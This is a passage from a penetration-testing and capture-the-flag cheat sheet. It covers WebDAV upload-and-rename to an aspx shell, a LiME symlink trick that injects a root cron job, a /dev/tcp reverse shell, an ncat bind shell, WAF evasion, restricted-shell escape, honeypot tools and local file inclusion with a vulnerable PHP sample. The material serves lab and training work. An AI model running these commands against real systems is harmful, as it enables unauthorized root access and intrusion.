<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">html</span>
<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">cfm</span>
<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">jhtml</span>
<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">php</span>
<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">jsp</span>
<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">txt</span>
<span class="n">Executes</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">html</span>
<span class="n">Executes</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a aspx meterpreter in a text file and then MOVE the .txt file to .aspx and execute the aspx file by using</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">MOVE</span> <span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">txt</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="n">Destination</span><span class="p">:</span> <span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">aspx</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p>In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let’s say the ramdump was saved at</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ramdump</span>
</pre></div>
</div>
<p>If, you create a symlink from /tmp/ramdump to /etc/crontab</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ramdump</span>
</pre></div>
</div>
<p>Now, when the ramdump is taken, lime will now dump the content of RAM straight into /etc/crontab. As crontab will ignore everything which doesn’t match the correct syntax. If the memory contains a injected string such as</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">cron</span><span class="o">.</span><span class="n">py</span>
<span class="nb">print</span> <span class="s2">&quot;* * * * * root /bin/bash /home/username/evilscript&quot;</span>
</pre></div>
</div>
<p>the injected string will end up in /etc/crontab will be executed.</p>
<p>The contents of evilscript can be</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">IP</span><span class="o">/</span><span class="n">Port</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>
</div>
<p>which will provide the root shell to the attacker. Thanks to TheColonial :)</p>
</li>
<li><p><a class="reference external" href="https://github.com/Arrexel/phpbash">phpbash</a> is a standalone, semi-interactive web shell. It’s main purpose is to assist in penetration tests where traditional reverse shells are not possible.</p></li>
<li><p>ps aux not fully visible try</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;`ps aux --sort -rss`&quot;</span>
</pre></div>
</div>
</li>
<li><p>If there’s a XXE on a website and possible RFI using internal address i.e on <a class="reference external" href="http://127.0.0.1:80/home=RFI">http://127.0.0.1:80/home=RFI</a> rather than <a class="reference external" href="http://10.54.98.10:80/home=RFI">http://10.54.98.10:80/home=RFI</a>, utilize XXE to send the request with localaddress.</p></li>
<li><p>If there’s a possible command execution on a website such as</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">A</span> <span class="s2">&quot;bitvijays&quot;</span> <span class="o">-</span><span class="n">i</span> <span class="s2">&quot;http://IPAddress/example?parameter=&#39;linux_command&#39;&quot;</span>
</pre></div>
</div>
<p>However, it is protected by a WAF, probably, try bash globbling techniques with ? and *. Refer <a class="reference external" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a> and <a class="reference external" href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0">Web Application Firewall (WAF) Evasion Techniques #2</a> ! Amazing stuff here!
Also, it might be a good idea to test the command with ? on your local machine first then directly on the target. Also, sometimes, it adding a space before or after the linux_command might work like ‘ linux_command’ or ‘linux_command ‘</p>
</li>
<li><p>Similar to ls there is dir in linux. Try “dir -l” Might be helpful sometimes.</p></li>
<li><p>Sometimes, we don’t have tools on the victim machine, in that case we can download static binaries from <a class="reference external" href="https://github.com/andrew-d/static-binaries">Static-Binaries</a> If not, found, try the deb or rpm package of the binary, extract it and upload.</p></li>
<li><p>mysql can execute statements in one liner using –execute or -e option</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mysql</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span> <span class="n">db_name</span>
<span class="o">--</span><span class="n">user</span><span class="o">=</span><span class="n">user_name</span><span class="p">,</span> <span class="o">-</span><span class="n">u</span> <span class="n">user_name</span>  <span class="p">:</span> <span class="n">The</span> <span class="n">MariaDB</span> <span class="n">user</span> <span class="n">name</span> <span class="n">to</span> <span class="n">use</span> <span class="n">when</span> <span class="n">connecting</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span><span class="o">.</span>
<span class="o">--</span><span class="n">password</span><span class="p">[</span><span class="o">=</span><span class="n">password</span><span class="p">],</span> <span class="o">-</span><span class="n">p</span><span class="p">[</span><span class="n">password</span><span class="p">]</span> <span class="p">:</span> <span class="n">The</span> <span class="n">password</span> <span class="n">to</span> <span class="n">use</span> <span class="n">when</span> <span class="n">connecting</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">use</span> <span class="n">the</span> <span class="n">short</span> <span class="n">option</span> <span class="n">form</span> <span class="p">(</span><span class="o">-</span><span class="n">p</span><span class="p">),</span> <span class="n">you</span> <span class="n">cannot</span> <span class="n">have</span> <span class="n">a</span> <span class="n">space</span> <span class="n">between</span> <span class="n">the</span> <span class="n">option</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">password</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">omit</span> <span class="n">the</span> <span class="n">password</span> <span class="n">value</span> <span class="n">following</span> <span class="n">the</span> <span class="o">--</span><span class="n">password</span> <span class="ow">or</span> <span class="o">-</span><span class="n">p</span> <span class="n">option</span> <span class="n">on</span> <span class="n">the</span> <span class="n">command</span> <span class="n">line</span><span class="p">,</span> <span class="n">mysql</span>
        <span class="n">prompts</span> <span class="k">for</span> <span class="n">one</span><span class="o">.</span>
<span class="o">--</span><span class="n">execute</span><span class="o">=</span><span class="n">statement</span><span class="p">,</span> <span class="o">-</span><span class="n">e</span> <span class="n">statement</span> <span class="p">:</span> <span class="n">Execute</span> <span class="n">the</span> <span class="n">statement</span> <span class="ow">and</span> <span class="n">quit</span><span class="o">.</span> <span class="n">Disables</span> <span class="o">--</span><span class="n">force</span> <span class="ow">and</span> <span class="n">history</span> <span class="n">file</span><span class="o">.</span> <span class="n">The</span> <span class="n">default</span> <span class="n">output</span> <span class="nb">format</span> <span class="ow">is</span> <span class="n">like</span> <span class="n">that</span> <span class="n">produced</span> <span class="k">with</span> <span class="o">--</span><span class="n">batch</span><span class="o">.</span>
</pre></div>
</div>
</li>
<li><p>If there’s .action file present in the URL on a Apache WebServer, <a class="reference external" href="https://svn.apache.org/repos/asf/struts/archive/trunk/struts-doc-1.1/api/org/apache/struts/action/package-summary.html">Apache Struts</a> might be installed on it. Check for Apache Struts vulnerabilities on it.</p></li>
<li><p>Windows XP Machine ? and we are able to put some files anywhere? Refer <a class="reference external" href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">Playing with MOF files on Windows, for fun &amp; profit</a></p></li>
<li><p>Good Post Exploitation Guide <a class="reference external" href="http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf">Windows Post-Exploitation Command List</a></p></li>
<li><p>Oracle Padding Attacks? Refer <a class="reference external" href="https://github.com/GDSSecurity/PadBuster">PadBuster</a></p></li>
<li><p>If there’s a cron job with</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="n">php</span> <span class="o">/</span><span class="n">path</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">your</span><span class="o">-</span><span class="n">project</span><span class="o">/</span><span class="n">artisan</span> <span class="n">schedule</span><span class="p">:</span><span class="n">run</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>
</div>
<p>possibly, we can edit schedule method of the AppConsoleKernel class (Kernel.php) in AppConsoleKernel and use exec method to execute commands on the operating systems.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$schedule-&gt;exec(&#39;node /home/forge/script.js&#39;)-&gt;daily();
</pre></div>
</div>
<p>Refer <a class="reference external" href="https://laravel.com/docs/5.6/scheduling">Task Scheduling</a></p>
</div></blockquote>
<ul class="simple">
<li><p>Handy Stuff</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>Utilize xxd to convert hex to ascii</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xxd</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span>
<span class="o">-</span><span class="n">p</span> <span class="o">|</span> <span class="o">-</span><span class="n">ps</span> <span class="o">|</span> <span class="o">-</span><span class="n">postscript</span> <span class="o">|</span> <span class="o">-</span><span class="n">plain</span> <span class="p">:</span> <span class="n">output</span> <span class="ow">in</span> <span class="n">postscript</span> <span class="n">continuous</span> <span class="n">hexdump</span> <span class="n">style</span><span class="o">.</span> <span class="n">Also</span> <span class="n">known</span> <span class="k">as</span> <span class="n">plain</span> <span class="n">hexdump</span> <span class="n">style</span><span class="o">.</span>
<span class="o">-</span><span class="n">r</span> <span class="o">|</span> <span class="o">-</span><span class="n">revert</span> <span class="p">:</span> <span class="n">reverse</span> <span class="n">operation</span><span class="p">:</span> <span class="n">convert</span> <span class="p">(</span><span class="ow">or</span> <span class="n">patch</span><span class="p">)</span> <span class="n">hexdump</span> <span class="n">into</span> <span class="n">binary</span><span class="o">.</span>  <span class="n">If</span> <span class="ow">not</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">xxd</span> <span class="n">writes</span> <span class="n">into</span> <span class="n">its</span> <span class="n">output</span> <span class="n">file</span> <span class="n">without</span> <span class="n">truncating</span> <span class="n">it</span><span class="o">.</span> <span class="n">Use</span> <span class="n">the</span> <span class="n">combination</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span> <span class="n">to</span> <span class="n">read</span> <span class="n">plain</span> <span class="n">hexadecimal</span> <span class="n">dumps</span> <span class="n">without</span> <span class="n">line</span> <span class="n">number</span> <span class="n">information</span> <span class="ow">and</span> <span class="n">without</span> <span class="n">a</span> <span class="n">particular</span> <span class="n">column</span> <span class="n">layout</span><span class="o">.</span> <span class="n">Additional</span> <span class="n">Whitespace</span> <span class="ow">and</span> <span class="n">line</span><span class="o">-</span><span class="n">breaks</span> <span class="n">are</span> <span class="n">allowed</span> <span class="n">anywhere</span><span class="o">.</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>We may use base64 -w 0 to disable line wrapping while encoding files with base64.</p></li>
<li><p>Use python</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>binascii.unhexlify(hexstr) to convert hex to string</p></li>
<li><p>base64.decodestring(str) to decode base64 string</p></li>
<li><p>Convert number to hex</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">hex</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
<span class="s1">&#39;0xf&#39;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Convert hex to decimal</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;6a48f82d8e828ce82b82&quot;</span>
<span class="n">i</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>If we are able to execute python code maybe use popen to execute os commands.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span>
<span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
<ul class="simple">
<li><p>Getting out of more</p></li>
</ul>
<blockquote>
<div><p>If in somecase, we are unable to ssh into the machine or being logged out when trying ssh, check the /etc/passwd file for the shell defined for that user.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">user1</span>
<span class="n">user1</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">11026</span><span class="p">:</span><span class="mi">11026</span><span class="p">:</span><span class="n">user</span> <span class="n">level</span> <span class="mi">1</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user1</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">showtext</span>
</pre></div>
</div>
<p>Here Instead of /bin/bash, user1 is using /usr/bin/showtext, which is apparently not a shell. Let’s look at the content of the file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">showtext</span>
<span class="c1">#!/bin/sh</span>
<span class="n">more</span> <span class="o">~/</span><span class="n">text</span><span class="o">.</span><span class="n">txt</span>
<span class="n">exit</span> <span class="mi">0</span>
</pre></div>
</div>
<p>In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell.</p>
</div></blockquote>
<ul class="simple">
<li><p>List all the files together</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span><span class="n">home</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">printf</span> <span class="s2">&quot;</span><span class="si">%f</span><span class="se">\t</span><span class="s2">%p</span><span class="se">\t</span><span class="si">%u</span><span class="s2">\</span><span class="si">%g</span><span class="se">\t</span><span class="s2">%m</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">|</span> <span class="n">column</span> <span class="o">-</span><span class="n">t</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
</section>
</section>
<section id="cyber-deception">
<h2>Cyber-Deception<a class="headerlink" href="#cyber-deception" title="Link to this heading"></a></h2>
<section id="wordpot">
<h3>Wordpot<a class="headerlink" href="#wordpot" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://github.com/gbrindisi/wordpot">Wordpot</a> : Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>python /opt/wp/wordpot.py --host=$lanip --port=69 --title=Welcome to XXXXXXX Blog Beta --ver=1.0 --server=XXXXXXXWordpress
</pre></div>
</div>
</section>
<section id="fakesmtp">
<h3>FakeSMTP<a class="headerlink" href="#fakesmtp" title="Link to this heading"></a></h3>
<p><a class="reference external" href="http://nilhcem.com/FakeSMTP/">FakeSMTP</a> : FakeSMTP is a Free Fake SMTP Server with GUI for testing emails in applications easily.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">fakesmtp</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">fakeSMTP</span><span class="o">-</span><span class="mf">2.1</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">.</span><span class="n">jar</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">b</span> <span class="o">-</span><span class="n">p</span> <span class="mi">2525</span> <span class="mf">127.0.0.1</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span>
</pre></div>
</div>
</section>
<section id="rubberglue">
<h3>Rubberglue<a class="headerlink" href="#rubberglue" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Rubberglue.md">Rubberglue</a> : We can use Rubberglue to listen on a port such that any traffic it receives on that port it will forward back to the client ( attacker ) on the same port.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python2</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">honeyports</span><span class="o">/</span><span class="n">honeyports</span><span class="o">-</span><span class="mf">0.4</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">p</span> <span class="mi">23</span>
</pre></div>
</div>
</section>
<section id="knockd">
<h3>Knockd<a class="headerlink" href="#knockd" title="Link to this heading"></a></h3>
<p><a class="reference external" href="http://www.zeroflux.org/projects/knock">Knockd - Port-knocking server</a> : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special “knock” sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open – since knockd listens at the link-layer level, it sees all traffic even if it’s destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.</p>
<p>If there is port knocking involved, read the /etc/knockd.conf, read the sequence port knock should be done and execute</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done
</pre></div>
</div>
</section>
<section id="dcept">
<h3>DCEPT<a class="headerlink" href="#dcept" title="Link to this heading"></a></h3>
<p>SecureWorks researchers have created a solution known as <a class="reference external" href="https://www.secureworks.com/blog/dcept">DCEPT (Domain Controller Enticing Password Tripwire)</a> to detect network intrusions. Github is <a class="reference external" href="https://github.com/secureworks/dcept">dcept</a></p>
</section>
</section>
<section id="useful-tools">
<h2>Useful Tools<a class="headerlink" href="#useful-tools" title="Link to this heading"></a></h2>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/g0tmi1k/exe2hex">exe2hex</a> : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell).</p></li>
<li><p><a class="reference external" href="https://github.com/secabstraction/PowerCat">Powercat</a> : A PowerShell TCP/IP swiss army knife that works with Netcat &amp; Ncat</p></li>
<li><p><a class="reference external" href="https://github.com/trustedsec/unicorn">Unicorn</a> is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.</p></li>
<li><p><a class="reference external" href="https://github.com/samratashok/nishang">Nishang</a> is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.</p></li>
<li><p><a class="reference external" href="https://nmap.org/book/ncat-man-examples.html">Ncat</a> Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project and is the culmination of the currently splintered family of Netcat incarnations. It is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses.
Among Ncat’s vast number of features there is the ability to chain Ncats together; redirection of TCP, UDP, and SCTP ports to other sites; SSL support; and proxy connections via SOCKS4, SOCKS5 or HTTP proxies (with optional proxy authentication as well). Some general principles apply to most applications and thus give you the capability of instantly adding networking support to software that would normally never support it.</p></li>
</ul>
<blockquote>
<div><p>Few important example is</p>
<p>Redirect any incoming traffic on TCP port 8080 on the local machine to host (example.org -in below example) on port 80.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ncat</span> <span class="o">--</span><span class="n">sh</span><span class="o">-</span><span class="n">exec</span> <span class="s2">&quot;ncat example.org 80&quot;</span> <span class="o">-</span><span class="n">l</span> <span class="mi">8080</span> <span class="o">--</span><span class="n">keep</span><span class="o">-</span><span class="nb">open</span>
</pre></div>
</div>
<p>Bind to TCP port 8081 and attach /bin/bash for the world to access freely.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ncat</span> <span class="o">--</span><span class="n">exec</span> <span class="s2">&quot;/bin/bash&quot;</span> <span class="o">-</span><span class="n">l</span> <span class="mi">8081</span> <span class="o">--</span><span class="n">keep</span><span class="o">-</span><span class="nb">open</span><span class="s2">&quot;&quot;</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="appendix-i-local-file-inclusion">
<span id="a1-local-file-inclusion"></span><h2>Appendix-I : Local File Inclusion<a class="headerlink" href="#appendix-i-local-file-inclusion" title="Link to this heading"></a></h2>
<p>Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input.</p>
<section id="tools">
<h3>Tools<a class="headerlink" href="#tools" title="Link to this heading"></a></h3>
<p>To test LFI, RFI, we can also use <a class="reference external" href="http://tools.kali.org/web-applications/uniscan">Uniscan</a> Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">uniscan</span> <span class="o">-</span><span class="n">h</span>
<span class="n">OPTIONS</span><span class="p">:</span>
  <span class="o">-</span><span class="n">h</span>  <span class="n">help</span>
  <span class="o">-</span><span class="n">u</span>  <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span> <span class="n">example</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
  <span class="o">-</span><span class="n">f</span>  <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">url</span><span class="s1">&#39;s</span>
  <span class="o">-</span><span class="n">b</span>  <span class="n">Uniscan</span> <span class="n">go</span> <span class="n">to</span> <span class="n">background</span>
  <span class="o">-</span><span class="n">q</span>  <span class="n">Enable</span> <span class="n">Directory</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">w</span>  <span class="n">Enable</span> <span class="n">File</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">e</span>  <span class="n">Enable</span> <span class="n">robots</span><span class="o">.</span><span class="n">txt</span> <span class="ow">and</span> <span class="n">sitemap</span><span class="o">.</span><span class="n">xml</span> <span class="n">check</span>
  <span class="o">-</span><span class="n">d</span>  <span class="n">Enable</span> <span class="n">Dynamic</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">s</span>  <span class="n">Enable</span> <span class="n">Static</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">r</span>  <span class="n">Enable</span> <span class="n">Stress</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">i</span>  <span class="o">&lt;</span><span class="n">dork</span><span class="o">&gt;</span> <span class="n">Bing</span> <span class="n">search</span>
  <span class="o">-</span><span class="n">o</span>  <span class="o">&lt;</span><span class="n">dork</span><span class="o">&gt;</span> <span class="n">Google</span> <span class="n">search</span>
  <span class="o">-</span><span class="n">g</span>  <span class="n">Web</span> <span class="n">fingerprint</span>
  <span class="o">-</span><span class="n">j</span>  <span class="n">Server</span> <span class="n">fingerprint</span>

<span class="n">usage</span><span class="p">:</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span> <span class="o">-</span><span class="n">qweds</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">f</span> <span class="n">sites</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">bqweds</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">i</span> <span class="n">uniscan</span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">i</span> <span class="s2">&quot;ip:xxx.xxx.xxx.xxx&quot;</span>
<span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">o</span> <span class="s2">&quot;inurl:test&quot;</span>
<span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span> <span class="o">-</span><span class="n">r</span>
</pre></div>
</div>
<p>There’s another tool called <a class="reference external" href="https://tools.kali.org/web-applications/fimap">fimap</a>. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don’t have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.</p>
</div>
<section id="filtering-in-lfi">
<h4>Filtering in LFI<a class="headerlink" href="#filtering-in-lfi" title="Link to this heading"></a></h4>
<p>Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly.</p>
<p>For example: the below code only includes the file which are named secret</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
  $file = @$_GET[&#39;filname&#39;];
  if(strlen($file) &gt; 55)
     exit(&quot;File name too long.&quot;);
  $fileName = basename($file);
  if(!strpos($file, &quot;secret&quot;))
    exit(&quot;No secret is selected.&quot;);
  echo &quot;&lt;pre&gt;&quot;;
  include($file);
  echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</pre></div>
</div>
</section>
